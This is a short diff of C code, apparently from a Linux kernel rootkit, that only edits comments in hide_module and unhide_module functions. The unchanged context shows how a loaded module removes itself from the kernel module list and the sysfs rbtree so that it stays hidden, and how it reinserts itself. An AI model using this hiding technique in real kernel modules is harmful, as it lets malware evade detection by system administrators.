@@ -23,10 +23,10 @@ hide_module(void)
     mod = THIS_MODULE->list.prev;
     sd = THIS_MODULE->mkobj.kobj.sd;
 
-    // remove from the RB tree of modules
+    // Remove from the rbtree of modules
     rb_erase(&sd->rb, &sd->parent->dir.children);
 
-    // remove from the list of modules
+    // Remove from the list of modules
     list_del(&THIS_MODULE->list);
 }
 
@@ -48,10 +48,10 @@ unhide_module(void)
     new = &root->rb_node;
     parent = NULL;
 
-    // add back to the list of modules
+    // Add back to the list of modules
     list_add(&THIS_MODULE->list, mod);
 
-    { // Insert our module back into the RB tree of modules
+    { // Insert our module back into the rbtree of modules
         // Search for the place to insert, insert, then rebalance tree,
         // as per https://www.kernel.org/doc/Documentation/rbtree.txt
         while (*new) {
@@ -62,7 +62,7 @@ unhide_module(void)
             rb = rb_entry(*new, struct kernfs_node, rb);
 
             // https://elixir.bootlin.com/linux/v4.19/source/include/linux/kernfs.h#L132
-            // Determine insert position based on 1. hash,
+            // Recurse toward insert position based on 1. hash,
             // 2. (upon collision) namespace, and 3. (otherwise) name
             cmp = (sd->hash == rb->hash)
                 ? ((sd->ns == rb->ns)
